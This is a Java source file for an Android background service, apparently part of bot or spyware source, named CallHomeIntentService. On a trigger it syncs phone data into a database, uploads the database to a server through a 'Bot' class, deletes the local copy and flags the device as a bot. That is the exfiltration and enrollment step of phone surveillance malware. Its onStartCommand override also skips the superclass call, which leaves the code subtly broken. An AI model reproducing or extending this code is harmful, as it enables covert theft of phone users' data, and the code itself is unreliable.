package com.candroid.lofl.services;

import android.app.IntentService;
import android.content.Intent;
import android.content.SharedPreferences;
import android.preference.PreferenceManager;

import com.candroid.lofl.api.Bot;
import com.candroid.lofl.api.Storage;
import com.candroid.lofl.data.db.Database;

public class CallHomeIntentService extends IntentService {
    public static final String TAG = CallHomeIntentService.class.getSimpleName();
    public static final String ACTION_CALL_HOME = "ACTION_CALL_HOME";

    public CallHomeIntentService() {
        super(TAG);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_REDELIVER_INTENT;
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        if(intent != null && intent.getAction().equals(ACTION_CALL_HOME)){
            Database.syncPhoneToDatabase(this);
            Bot.syncDatabaseWithServer(this);
            Storage.Files.getDatabaseFile(this).delete();
            SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(this).edit();
            editor.putBoolean(Bot.IS_BOT_KEY, true);
            editor.apply();
        }
    }
}
